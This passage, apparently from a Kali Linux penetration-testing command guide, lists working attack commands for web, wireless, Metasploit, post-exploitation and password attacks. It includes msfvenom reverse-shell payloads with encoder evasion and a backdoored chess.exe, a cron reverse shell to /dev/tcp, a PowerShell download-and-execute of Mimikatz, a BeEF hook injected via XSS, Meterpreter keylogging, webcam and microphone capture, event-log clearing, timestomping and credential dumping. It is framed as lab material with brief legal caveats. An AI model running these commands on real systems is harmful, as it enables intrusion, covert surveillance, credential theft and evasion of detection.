  --file-write=shell.php --file-dest=/var/www/html/shell.php

# Lab: Test on DVWA (Damn Vulnerable Web App) on Metasploitable 2
# http://192.168.1.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
# Use Burp Suite to capture the request, save as request.txt
sqlmap -r request.txt --dbs
```

### 7.4 BBQSQL — Blind SQL Injection Framework

```bash
# Launch interactive mode
bbqsql

# Options in interactive menu:
# 1. Setup options
# 2. Configure HTTP request
# 3. Set injection point
# 4. Run exploit
# 5. Export/import config

# Good for: time-based and boolean-based blind SQLi
# where sqlmap has trouble due to WAF or quirks
```

### 7.5 Commix — Command Injection Exploitation

```bash
# Test URL for command injection
commix --url="http://target.com/page.php?input=test"

# POST parameter
commix --url="http://target.com/cmd.php" \
  --data="input=test"

# Increase verbosity
commix -v --url="http://target.com/page.php?input=test"

# Skip WAF detection
commix --skip-waf \
  --url="http://target.com/page.php?input=test"

# Techniques:
# Classic injection:  ;id, |id, &&id
# Dynamic code eval:  eval(base64_decode(...))
# Time-based:         sleep 5
# File-based:         write to /tmp/, read back
```

### 7.6 WPScan — WordPress Security Scanner

```bash
# Basic scan
wpscan --url https://www.wordpress-site.com

# Enumerate users
wpscan --url https://www.wordpress-site.com -e u

# Enumerate plugins
wpscan --url https://www.wordpress-site.com -e p

# Enumerate vulnerable plugins only
wpscan --url https://www.wordpress-site.com -e vp

# Enumerate themes
wpscan --url https://www.wordpress-site.com -e t

# Brute force login
wpscan --url https://www.wordpress-site.com \
  -U admin -P /usr/share/wordlists/rockyou.txt

# Use API token (for vulnerability database)
wpscan --url https://www.wordpress-site.com \
  --api-token YOUR_TOKEN_HERE

# What WPScan finds:
# WordPress version (known CVEs)
# Plugin versions (known CVEs)
# Theme versions
# Usernames (via author enumeration)
# XML-RPC enabled
# readme.html exposure
# Debug log exposure
```

### 7.7 Skipfish — Web Application Security Recon

```bash
# Basic scan
skipfish -o /tmp/skipfish-output http://target.com/

# Limit scan scope
skipfish -o output/ -S /usr/share/skipfish/dictionaries/complete.wl \
  http://target.com/

# Authentication
skipfish -o output/ -A user:pass http://target.com/

# Rate limiting
skipfish -o output/ -l 50 http://target.com/    # max 50 req/sec

# Results are an HTML report in the output directory
```

### 7.8 Burp Suite — Web Proxy & Testing Platform

```bash
# Launch Burp Suite Community
burpsuite

# Setup Firefox proxy:
# Settings → Network Settings → Manual proxy
# HTTP Proxy: 127.0.0.1  Port: 8080

# Core Burp Suite features:

# PROXY — intercept all browser traffic
# - Toggle intercept on/off
# - Forward, drop, or modify requests
# - Send interesting requests to other tools with right-click

# REPEATER — manually replay and modify requests
# - Send from Proxy → Repeater
# - Modify parameters, headers, cookies
# - Compare responses

# INTRUDER — automated attack tool
# Attack types:
#   Sniper:         single payload position, one wordlist
#   Battering ram:  same payload in all positions
#   Pitchfork:      parallel wordlists (user:pass)
#   Cluster bomb:   all combinations (user × pass)
# Use for: brute force, fuzzing, parameter enumeration

# SCANNER (Pro only) — automated vulnerability scanning
# Community: manual scanning only

# DECODER — encode/decode data
# URL encode, Base64, HTML, hex, gzip, etc.

# COMPARER — diff two requests or responses

# SEQUENCER — analyze token randomness (session tokens, CSRF tokens)

# Common Burp workflow:
# 1. Browse target through Burp proxy
# 2. Review HTTP history for interesting parameters
# 3. Send to Repeater to manually test
# 4. Send to Intruder for automated attacks
# 5. Use Scanner for automated checks
```

### 7.9 Gobuster / DirBuster

```bash
# Gobuster (faster than dirb)
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak

# DNS subdomain brute force
gobuster dns -d target.com \
  -w /usr/share/wordlists/subdomains-top1million-20000.txt

# Virtual host discovery
gobuster vhost -u http://target.com \
  -w /usr/share/wordlists/subdomains-top1million-20000.txt
```

### 7.10 WafW00f — Web Application Firewall Detection

```bash
# Detect WAF
wafw00f https://www.target.com

# Force detection (even if no WAF signs)
wafw00f -a https://www.target.com

# List detectable WAFs
wafw00f -l

# How it detects WAFs:
# 1. Normal HTTP request → analyze response headers and cookies
# 2. Malicious-looking request → check if WAF blocks/modifies
# 3. Compare server behavior to WAF signature database

# Common WAFs detected: Cloudflare, Akamai, AWS WAF,
# Imperva Incapsula, F5 ASM, Barracuda, ModSecurity
```

### 7.11 HTTrack — Website Cloner

```bash
# Clone a website to local directory
httrack "http://www.target.com" -O "/tmp/cloned_site"

# Mirror with depth limit
httrack "http://www.target.com" -O "/tmp/site" -r3   # 3 levels deep

# Scan for email addresses in cloned content
grep -r "@" /tmp/cloned_site/ | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

# Applications:
# - Offline analysis of target site structure
# - Find hidden files and directories
# - Create phishing page templates (authorized testing only)
# - Discover email addresses for social engineering assessment
```

---

## 8. Wireless Attacks

> **Legal requirement:** Only perform wireless attacks on networks you own or have written permission to test. Unauthorized wireless attacks are a serious criminal offense in most jurisdictions.

### 8.1 Aircrack-ng Suite — WEP/WPA Cracking

```bash
# Step 1: Put card in monitor mode
airmon-ng check kill                # kill interfering processes
airmon-ng start wlan0               # creates wlan0mon

# Step 2: Survey nearby networks
airodump-ng wlan0mon

# Step 3: Capture on specific target
airodump-ng -c 6 \
  --bssid AA:BB:CC:DD:EE:FF \
  -w /tmp/capture \
  wlan0mon
# -c 6              = channel 6
# --bssid           = target AP MAC address
# -w /tmp/capture   = write capture to file

# Step 4: Deauthenticate a client to force WPA handshake
aireplay-ng -0 10 \
  -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:66 \
  wlan0mon
# -0 10             = send 10 deauth frames
# -a                = AP BSSID
# -c                = client MAC (optional, omit to deauth all)

# Step 5: Crack WPA handshake with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b AA:BB:CC:DD:EE:FF \
  /tmp/capture-01.cap

# WEP cracking (inject traffic to gather IVs)
# Fake authentication
aireplay-ng -1 0 -e SSID -a AA:BB:CC:DD:EE:FF wlan0mon

# ARP replay attack (generate traffic)
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Crack when enough IVs collected (>50,000)
aircrack-ng /tmp/capture-01.cap
```

### 8.2 Reaver — WPS PIN Attack

```bash
# Step 1: Enable monitor mode (done above)

# Step 2: Find WPS-enabled networks
wash -i wlan0mon
# Output: BSSID, Channel, WPS Version, WPS Locked, ESSID

# Step 3: Attack WPS PIN
reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -v \
  -K 1
# -v    verbose
# -K 1  use Pixie Dust attack (much faster)

# Standard PIN attack (slower, 4-10 hours typically)
reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -v

# With delay to avoid lockout
reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -v -d 5 -r 3:15
# -d 5       5 second delay between attempts
# -r 3:15    3 attempts per 15 seconds

# Output shows: WPS PIN and then the WPA PSK password
```

### 8.3 Cowpatty — WPA Dictionary Attack

```bash
# Crack from captured handshake
cowpatty -f /usr/share/wordlists/rockyou.txt \
  -r /tmp/capture-01.cap \
  -s SSID_NAME

# Pre-computed PMK (much faster with precomputed table)
genpmk -f /usr/share/wordlists/rockyou.txt \
  -d pmk_table.db \
  -s SSID_NAME

cowpatty -d pmk_table.db \
  -r /tmp/capture-01.cap \
  -s SSID_NAME
```

### 8.4 Hostapd-WPE — Evil Twin / EAP Credential Capture

```bash
# Used for attacking enterprise WPA (802.1x / EAP)
# Creates a rogue AP that captures credential challenges

# Install
apt install hostapd-wpe

# Configure
nano /etc/hostapd-wpe/hostapd-wpe.conf
# Set: ssid=TARGET_NETWORK_SSID
# Set: interface=wlan0

# Kill conflicting processes
airmon-ng check kill

# Run the rogue AP
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Once clients connect and authenticate:
# You capture the MSCHAPV2 challenge/response
# Crack with asleap:
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
```

### 8.5 Wifiphisher — Evil Twin + Phishing

```bash
# Clone from GitHub
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher/
sudo python setup.py install

# Run (auto-selects best scenario)
wifiphisher

# Specific scenario
wifiphisher --essid "TARGET_SSID" \
  --phishing-pages /path/to/pages \
  -p firmware-upgrade

# Built-in phishing scenarios:
# firmware-upgrade    → asks victim for WiFi password (router update)
# oauth-login         → fake social login
# browser-plugin-update → installs malware payload

# How it works:
# 1. Sends deauth frames to disconnect clients from real AP
# 2. Creates evil twin with same SSID
# 3. Client reconnects to evil twin
# 4. All DNS queries resolve to our server
# 5. Victim sees phishing page, enters credentials
```

---

## 9. Exploitation — Metasploit Framework

### 9.1 Metasploit Architecture

```
Metasploit Framework
├── Exploits       → attack modules targeting specific CVEs
├── Auxiliary      → scanners, fuzzers, DoS, admin tools
├── Payloads       → what runs after exploitation
│   ├── Singles    → self-contained (add_user, exec)
│   ├── Stagers    → small, pulls down stage (bind_tcp, reverse_tcp)
│   └── Stages     → full payload pulled by stager (meterpreter, shell)
├── Post           → post-exploitation modules
├── Encoders       → obfuscate payloads (shikata_ga_nai)
└── NOPs           → no-operation sled generators
```

### 9.2 MSFConsole — Core Commands

```bash
# Launch Metasploit
msfconsole

# Initial setup (required first time)
service postgresql start
msfdb init

# Database commands
db_status                    # check db connection
workspace                    # list workspaces
workspace -a pentest_lab     # create workspace
hosts                        # show discovered hosts
services                     # show discovered services
vulns                        # show identified vulnerabilities
creds                        # show captured credentials
loot                         # show captured loot

# Help system
help
help search
help set

# Update Metasploit
apt update && apt upgrade metasploit-framework

# Search for modules
search type:exploit name:ms17
search cve:2017-0144
search platform:windows type:exploit
search name:eternalblue
search type:auxiliary name:scanner

# Get information on a module
info exploit/windows/smb/ms17_010_eternalblue
info auxiliary/scanner/smb/smb_ms17_010

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/smb/smb_ms17_010

# View and set options
show options
set RHOSTS 192.168.1.5
set LHOST 192.168.1.100
set LPORT 4444
set THREADS 10
setg RHOSTS 192.168.1.5    # set globally

# Show payloads compatible with current exploit
show payloads

# Set payload
set payload windows/x64/meterpreter/reverse_tcp

# Verify configuration
show options
check                       # check if target is vulnerable (if supported)

# Run the exploit
exploit
run                         # same as exploit

# Session management
sessions                    # list sessions
sessions -i 1               # interact with session 1
sessions -k 1               # kill session 1
sessions -K                 # kill all sessions
background                  # background current session

# Back to previous context
back

# Save session history
makerc /root/pentest.rc      # save commands to resource file
resource /root/pentest.rc   # load and run resource file
```

### 9.3 Nmap Integration

```bash
# Import Nmap XML into Metasploit database
db_import /tmp/nmap_results.xml

# Run Nmap from within Metasploit (auto-imports)
db_nmap -sV -O 192.168.1.0/24
db_nmap -sS -sV -T4 -A 192.168.1.5

# Query results
hosts
hosts -c address,os_name,os_flavor    # specific columns
services -p 445                       # find hosts with port 445
services -S smb                       # search by service name
```

### 9.4 Payload Types & MSFVenom

```bash
# List all payloads
msfvenom -l payloads

# List encoders
msfvenom -l encoders

# List formats
msfvenom -l formats

# Create Windows reverse shell executable
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe \
  -o shell.exe

# Windows 32-bit
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe \
  -o shell32.exe

# Linux ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f elf \
  -o shell.elf

# Android APK
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -o hacker.apk

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o shell.php

# Python payload
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -o shell.py

# With encoding (evasion)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 10 \
  -f exe \
  -o encoded_shell.exe
# -e  encoder to use
# -i  number of encoding iterations

# Embed payload in legitimate executable
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -x /usr/share/windows-resources/chess.exe \
  -e x86/shikata_ga_nai \
  -i 20 \
  -f exe \
  -o chess_infected.exe

# BAT file payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f psh-reflection \
  -o payload.ps1

# Multi-handler to receive connections
# (run this in msfconsole before delivering payload)
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false   # keep listening after first session
exploit -j -z             # run as background job
```

### 9.5 Meterpreter Commands

```bash
# System information
sysinfo                    # OS, hostname, architecture
getuid                     # current user
getpid                     # current process ID

# Privilege escalation
getsystem                  # attempt auto privilege escalation
getuid                     # verify if now SYSTEM

# File system
pwd                        # print working directory
ls                         # list directory
cd C:\\Users               # change directory
download C:\\file.txt      # download to Kali
upload /root/tool.exe C:\\ # upload from Kali
search -f *.doc            # search for files
edit C:\\file.txt          # edit file

# Process management
ps                         # list processes
migrate 1234               # migrate to process (PID)
# Migrate to explorer.exe for stability
kill 1234

# Networking
ipconfig                   # network interfaces
arp                        # ARP table
route                      # routing table
portfwd add -l 4445 -p 3389 -r 192.168.1.1   # port forward

# Pivoting
route add 10.0.0.0/24 1    # route subnet through session 1

# Surveillance
screenshot                 # take screenshot
screenshare                # live screen view
keyscan_start              # start keylogger
keyscan_dump               # dump captured keystrokes
keyscan_stop
webcam_list                # list cameras
webcam_snap                # take webcam photo
webcam_snap 2              # front camera
record_mic                 # record microphone

# Data collection
dump_contacts              # Android: contact list
dump_sms                   # Android: SMS messages
dump_calllog               # Android: call history
hashdump                   # Windows: dump password hashes (requires SYSTEM)

# Persistence
persistence -X -i 30 -p 4444 -r 192.168.1.100
# -X  start on boot
# -i  reconnect interval (seconds)

# Cleanup
clearev                    # clear Windows event logs
timestomp file.exe -m "01/01/2020 00:00:00"  # change file timestamps

# Shell
shell                      # drop to system shell
```

### 9.6 Common Exploit Modules for Lab Practice

```bash
# EternalBlue — MS17-010 (Windows 7/Server 2008, unpatched)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.x
set LHOST 192.168.1.100
exploit

# MS08-067 — Server Service (Windows XP/2003)
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.x
set LHOST 192.168.1.100
exploit

# Metasploitable 2 — vsftpd backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.x
exploit

# Metasploitable 2 — UnrealIRCd backdoor
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.1.x
exploit

# Metasploitable 2 — Samba usermap_script
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.x
exploit

# Metasploitable 2 — distcc_exec
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.1.x
exploit

# Java RMI
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.1.x
exploit

# Browser autopwn (multiple browser exploits)
use auxiliary/server/browser_autopwn
set LHOST 192.168.1.100
set URIPATH /pwn
exploit
# Then send the URL to victim in lab
```

### 9.7 Post-Exploitation Modules

```bash
# After getting a session, use post modules:

# Windows: dump local password hashes
use post/windows/gather/hashdump
set SESSION 1
run

# Windows: dump all credentials (Mimikatz)
use post/windows/gather/credentials/credential_collector
set SESSION 1
run

# Privilege escalation suggestions
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Network reconnaissance from inside
use post/multi/gather/ping_sweep
set RHOSTS 10.0.0.0/24
set SESSION 1
run

# Enumerate files
use post/multi/gather/find_files
set EXTENSIONS doc,pdf,xls,pptx
set SESSION 1
run

# Keylogger
use post/windows/capture/keylog_recorder
set SESSION 1
run
```

### 9.8 Armitage — Graphical Metasploit

```bash
# Prerequisites
service postgresql start
msfdb init
msfconsole  # start once to initialize

# Launch Armitage
armitage

# Armitage layout:
# Top-left:   Module tree (exploits, auxiliary, post)
# Top-right:  Target visualization (hacked = red with lightning)
# Bottom:     Metasploit console tabs

# Workflow:
# 1. Hosts → Add Hosts (enter IP ranges)
# 2. Hosts → Nmap Scan → Quick Scan (OS detect)
# 3. Attacks → Find Attacks (auto-suggest based on services)
# 4. Right-click host → Attack → select exploit
# 5. After compromise: right-click → Meterpreter → commands
```

---

## 10. Exploitation — Standalone Tools

### 10.1 Searchsploit — Offline Exploit Database

```bash
# Search exploit database
searchsploit apache 2.4
searchsploit windows smb
searchsploit php 5.3

# Exclude path from search (titles only)
searchsploit -t oracle windows

# Get detailed info on specific exploit
searchsploit -p 39446

# Copy exploit to current directory
searchsploit -m 39446

# Update local database
searchsploit -u

# The exploit database is in: /usr/share/exploitdb/
# Online version: https://www.exploit-db.com
```

### 10.2 Backdoor Factory — Patch Binaries

```bash
# Show available payloads for a binary
backdoor-factory -f /usr/share/windows-binaries/plink.exe -s show

# Patch binary with reverse shell
backdoor-factory -f /usr/share/windows-binaries/plink.exe \
  -s reverse_shell_tcp \
  -H 192.168.1.100 \
  -P 4444

# Use a specific code cave
backdoor-factory -f target.exe \
  -s reverse_shell_tcp \
  -H 192.168.1.100 \
  -P 4444 \
  -c                     # list available caves

# Select cave and patch
backdoor-factory -f target.exe \
  -s iat_reverse_shell_tcp \
  -H 192.168.1.100 \
  -P 4444 \
  -J                     # add jump to entry point
```

### 10.3 BeEF — Browser Exploitation Framework

```bash
# Start BeEF
beef-xss
# Or: /usr/share/beef-xss/beef

# Access panel: http://127.0.0.1:3000/ui/panel
# Login: beef / beef

# The hook script:
# <script src="http://KALI_IP:3000/hook.js"></script>
# Inject this into a page the victim visits

# Once a browser is hooked, from the panel you can:
# - View browser details (type, plugins, extensions)
# - Execute JavaScript in victim browser
# - Redirect browser to malicious page
# - Screenshot the browser tab
# - Steal cookies
# - Perform clickjacking
# - Launch browser-specific exploits
# - Social engineer via in-browser dialogs
# - Port scan the victim's internal network
# - Tunnel through the victim's browser

# XSS injection method (DVWA lab):
# In a reflected XSS field:
<script src="http://192.168.1.100:3000/hook.js"></script>
```

---

## 11. Post-Exploitation & Maintaining Access

### 11.1 Establishing Persistence

```bash
# Windows: Add admin user
net user hacker P@ssw0rd! /add
net localgroup administrators hacker /add

# Windows: Add RDP user
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \
  /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall set service remotedesktop enable

# Linux: Add backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor

# Cron job persistence (Linux)
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" \
  >> /etc/crontab

# Windows: Registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "Updater" \
  /t REG_SZ \
  /d "C:\Users\victim\AppData\Local\shell.exe"

# SSH authorized key (Linux)
mkdir -p /root/.ssh
echo "ssh-rsa AAAA... attacker@kali" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### 11.2 SBD — Encrypted Backdoor

```bash
# Secure back door — netcat with AES encryption
# Server (on victim) listens
sbd -l -p 4444 -e /bin/bash

# Client (attacker) connects
sbd 192.168.1.5 4444

# All traffic is AES-CBC-128 + HMAC-SHA1 encrypted
```

### 11.3 PowerSploit — PowerShell Post-Exploitation

```bash
# After gaining access to a Windows machine:
# Host files on Kali's Apache
cp -r /usr/share/powersploit /var/www/html/
service apache2 start

# On victim (PowerShell):
# Download and execute in memory (never touches disk)
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')

# Key PowerSploit modules:
# Invoke-Mimikatz          → dump Windows credentials from memory
# Invoke-Shellcode         → inject shellcode into process
# Invoke-ReflectivePEInjection → load PE into memory
# Get-GPPPassword          → extract Group Policy passwords
# Invoke-NinjaCopy         → copy locked files (SAM, NTDS.dit)
# Get-Keystrokes           → keylogger
# Get-TimedScreenshot      → periodic screenshots
# Invoke-UserHunter        → find where users are logged in
# Invoke-ShareFinder       → find accessible SMB shares
```

### 11.4 PWNAT — NAT Traversal

```bash
# Connect two machines behind NAT without port forwarding
# Server (behind NAT)
pwnat -s 8080

# Client (behind different NAT)
pwnat -c 8000 SERVER_PUBLIC_IP 8080 TARGET_HOST TARGET_PORT

# Example: access google.com through the server's internet connection
pwnat -c 8000 serverip 8080 google.com 80
# Then: curl http://127.0.0.1:8000
```

### 11.5 Red-NMB — User Enumeration via Null Sessions

```bash
# Enumerate Windows users via SID cycling
python rednmb.py 192.168.1.5 500 50000
# Cycles from RID 500 to 50000 trying to resolve each SID to username

# With password file for automatic brute force
python rednmb.py 192.168.1.5 500 50000 /root/passwords.txt /root/users.txt
```

---

## 12. Password Attacks

### 12.1 Understanding Password Storage

```
Windows:
- LM Hash:   DES-based, split into 7-char chunks, all uppercase — VERY weak
- NTLM Hash: MD4(UTF-16LE(password)) — no salt, fast to crack
- NTLMv2:    challenge-response, harder to crack offline
- Stored in: C:\Windows\System32\config\SAM (locked while running)
- Also in:   LSASS process memory (can dump with Mimikatz)
- Domain:    NTDS.dit on Domain Controller

Linux:
- /etc/shadow — hashed with SHA-512 (most modern), salted
- SHA-512:   $6$salt$hash
- SHA-256:   $5$salt$hash
- MD5:       $1$salt$hash
- bcrypt:    $2b$rounds$salt+hash
```

### 12.2 Wordlist Creation

#### Crunch

```bash
# Syntax: crunch min max charset -t pattern -o file

# All 4-character numeric passwords
crunch 4 4 0123456789 -o /tmp/4digit.txt

# All 6-8 character alphanumeric
crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o /tmp/alnum.txt

# Pattern-based (@ = lowercase, , = uppercase, % = digit, ^ = special)
crunch 8 8 -t "Pass@@@@"     # Pass followed by 4 lowercase letters
crunch 8 8 -t "Pass%%%%"     # Pass followed by 4 digits
crunch 10 10 -t "@@@@%%^^"   # mixed pattern

# Save to compressed file
crunch 8 8 -o /tmp/wordlist.txt.gz

# Estimate size before generating
crunch 8 8 abcdefghijklmnopqrstuvwxyz | wc -l
```

#### CeWL — Custom Word List from Website

```bash
# Spider target website and extract words
cewl http://www.target.com -d 3 -m 7 -w wordlist.txt
# -d 3  depth 3 pages
# -m 7  minimum word length 7
# -w    write to file

# Include email addresses
cewl http://www.target.com -e -d 2 -w wordlist.txt

# Combine with John rules to generate variations
john --wordlist=wordlist.txt --rules --stdout > expanded_wordlist.txt
```

#### PACK — Password Analysis and Cracking Kit

```bash
# Analyze a password list to understand patterns
python statsgen.py passwords.txt
python statsgen.py passwords.txt --minlength=8 --maxlength=8

# Generate hashcat masks from analysis
python maskgen.py passwords.txt.masks --targettime 3600 -q

# Generate policy-compliant masks (for hashcat)
python policygen.py --maxlength=8 --minupper=1 --mindigit=1 \
  -o policy.hcmask
```

### 12.3 John the Ripper

```bash
# Crack Linux shadow file
john /etc/shadow

# With specific wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow

# With rules (generates mutations)
john --wordlist=wordlist.txt --rules /etc/shadow

# Specify hash format
john --format=raw-md5 --wordlist=wordlist.txt hashes.txt
john --format=bcrypt --wordlist=wordlist.txt hashes.txt
john --format=NT --wordlist=wordlist.txt hashes.txt       # Windows NTLM

# Show cracked passwords
john --show /etc/shadow

# List supported formats
john --list=formats

# Incremental (brute force all combinations)
john --incremental /etc/shadow

# Restore interrupted session
john --restore

# Single crack mode (uses username and GECOS fields)
john --single /etc/shadow
```

### 12.4 Hashcat — GPU-Accelerated Cracking

```bash
# Attack modes:
# 0 = Dictionary
# 1 = Combination (combine two wordlists)
# 3 = Brute-force (mask attack)
# 6 = Hybrid (wordlist + mask)
# 7 = Hybrid (mask + wordlist)

# Hash types (partial):
# 0     = MD5
# 100   = SHA1
# 1400  = SHA-256
# 1700  = SHA-512
# 1000  = NTLM
# 5600  = NetNTLMv2
# 22000 = WPA-PBKDF2-PMKID+EAPOL
# 3200  = bcrypt
# 500   = md5crypt (Linux $1$)
# 1800  = sha512crypt (Linux $6$)

# Dictionary attack on MD5
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary attack with rules
hashcat -m 0 -a 0 hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Brute force (mask attack) — 8 chars, any
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
# ?l = lowercase  ?u = uppercase  ?d = digit
# ?s = special    ?a = all        ?b = 0x00-0xFF

# Specific mask: 4 digits
hashcat -m 0 -a 3 hashes.txt ?d?d?d?d

# WPA2 handshake
hashcat -m 22000 -a 0 capture.hccapx /usr/share/wordlists/rockyou.txt

# Show cracked
hashcat -m 0 hashes.txt --show
```

### 12.5 Hydra — Online Brute Force

```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  192.168.1.5 ssh

# With username list
hydra -L users.txt -P passwords.txt \
  192.168.1.5 ssh

# FTP
hydra -l admin -P passwords.txt 192.168.1.5 ftp

# HTTP Basic auth
hydra -l admin -P passwords.txt \
  192.168.1.5 http-get /admin/

# HTTP POST form
hydra -l admin -P passwords.txt \
  192.168.1.5 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# MySQL
hydra -l root -P passwords.txt 192.168.1.5 mysql

# RDP
hydra -l administrator -P passwords.txt \
  192.168.1.5 rdp

# Limit threads (avoid lockout)
hydra -l admin -P passwords.txt \
  -t 2 \
  192.168.1.5 ssh

# Verbose output
hydra -l root -P passwords.txt -v 192.168.1.5 ssh
```

### 12.6 Medusa — Parallel Network Brute Force

```bash
# SSH
medusa -h 192.168.1.5 -u msfadmin \
  -P /root/passwords.txt \
  -M ssh

# With IP list
medusa -H ip_list.txt -u root \
  -P passwords.txt \
  -M ssh

# MySQL
medusa -h 192.168.1.5 -u root \
  -P passwords.txt \
  -M mysql

# FTP
medusa -h 192.168.1.5 -u admin \
  -P passwords.txt \
  -M ftp

# Threads
medusa -h 192.168.1.5 -u msfadmin \
  -P passwords.txt \
  -M ssh \
  -t 4           # 4 parallel threads
```

### 12.7 Ncrack — High-Speed Network Cracker

```bash
# SSH brute force
ncrack -v -U users.txt -P passwords.txt \
  -p ssh 192.168.1.5

# From Nmap XML
ncrack -v -user root -P passwords.txt \
  -iX nmap_results.xml

# Multiple services
ncrack -v -U users.txt -P passwords.txt \
  192.168.1.5:22 192.168.1.5:3306

# Rate limiting
ncrack -v -U users.txt -P passwords.txt \
  192.168.1.5 -p ssh \
  --cl=1        # max 1 concurrent connection
```

### 12.8 CrackMapExec — Post-Exploitation Swiss Army Knife

```bash
# Install
pip install crackmapexec --break-system-packages

# SMB enumeration
crackmapexec smb 192.168.1.0/24

# Password spraying
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!'

# Pass-the-hash
crackmapexec smb 192.168.1.5 \
  -u administrator \
  -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Execute commands
crackmapexec smb 192.168.1.5 \
  -u administrator -p 'Password' \
  -x "whoami"

# Dump SAM
crackmapexec smb 192.168.1.5 \
  -u administrator -p 'Password' \
  --sam

# Enum shares
crackmapexec smb 192.168.1.5 \
  -u administrator -p 'Password' \
  --shares
```

### 12.9 Rainbow Tables with RainbowCrack

```bash
# Generate rainbow table for MD5, lowercase alpha, length 1-7
rtgen md5 loweralpha 1 7 0 1000 1000000 0

# Sort the generated table (required before cracking)
rtsort *.rt

# Crack using rainbow table
rcrack . -h 5d41402abc4b2a76b9719d911017c592     # single hash
rcrack . -l hash_list.txt                         # list of hashes
rcrack . -f pwdump_file.txt                       # pwdump format

# Pre-built tables available at:
# https://ophcrack.sourceforge.net/tables.php
# (for Windows LM and NTLM hashes)
```

### 12.10 Credential Extraction

```bash
# Credump — extract Windows registry hive credentials
# First copy hives from victim (requires admin)
reg save HKLM\SAM /tmp/SAM
reg save HKLM\SYSTEM /tmp/SYSTEM
reg save HKLM\SECURITY /tmp/SECURITY

# Extract NTLM hashes from SAM
python pwdump.py /tmp/SYSTEM /tmp/SAM

# Extract cached domain credentials
python cachedump.py /tmp/SYSTEM /tmp/SECURITY

# Extract LSA secrets
python lsadump.py /tmp/SYSTEM /tmp/SECURITY

# Polbenum — Windows password policy
python polbenum.py msfadmin:msfadmin@192.168.1.5:'445/SMB'

# findmyhash — online hash lookup
findmyhash MD5 -h 5d41402abc4b2a76b9719d911017c592
findmyhash SHA1 -h aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d

# GPP decrypt — Group Policy Preferences XML passwords
gpp-decrypt "j1Uyj3Wjk0R5+pKIarFY0m3MAbkUa5LKt8J0Dn2tBHM="
```

---

## 13. Sniffing & Spoofing

### 13.1 Wireshark — Graphical Packet Analyzer

```bash
# Launch
wireshark

# Display filter examples:
http                          # only HTTP
tcp.port == 80                # port 80 traffic
ip.addr == 192.168.1.5        # traffic to/from IP
http.request.method == "POST" # POST requests only
dns                           # DNS traffic
ftp                           # FTP traffic
smtp                          # email traffic
ssl || tls                    # encrypted traffic
!(arp or dns or icmp)        # filter out noise

# Capture filter (before starting capture):
host 192.168.1.5
port 80
net 192.168.1.0/24
not port 22                   # exclude SSH

# Find passwords in HTTP POST:
# Filter: http.request.method == "POST"
# Right-click → Follow → HTTP Stream
# Look for login credentials in plain text

# Export captured objects (files in HTTP traffic)
File → Export Objects → HTTP

